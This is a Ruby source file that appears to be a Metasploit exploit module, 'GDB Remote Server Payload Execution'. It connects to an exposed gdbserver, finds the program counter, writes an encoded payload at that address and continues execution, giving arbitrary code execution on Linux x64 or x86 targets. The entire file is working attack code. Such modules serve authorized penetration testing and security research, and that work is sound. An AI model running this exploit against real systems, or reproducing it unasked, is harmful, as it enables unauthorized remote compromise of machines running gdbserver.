##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Gdb

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'GDB Remote Server Payload Execution',
      'Description'    => %q{
          This module attempts to execute an arbitrary payload on a gdbserver service.
      },
      'Author'         => [ 'joev' ],
      'Targets'        => [
        [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ],
        [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]
      ],
      'DefaultTarget' => 0,
      'Platform'       => [ 'linux', 'unix', 'osx', 'windows' ]
    ))
  end

  def exploit
    connect

    print_status "Performing handshake with gdbserver..."
    handshake

    print_status "Stepping program to find PC..."
    pc = get_pc

    print_status "Writing payload at #{pc}..."
    write(payload.encoded, pc)

    print_status "Executing the payload..."
    continue

    # gdb throws a SIGINT on the execve, so a second continue is necessary
    continue(read: false)

    handler
    disconnect
  end

end
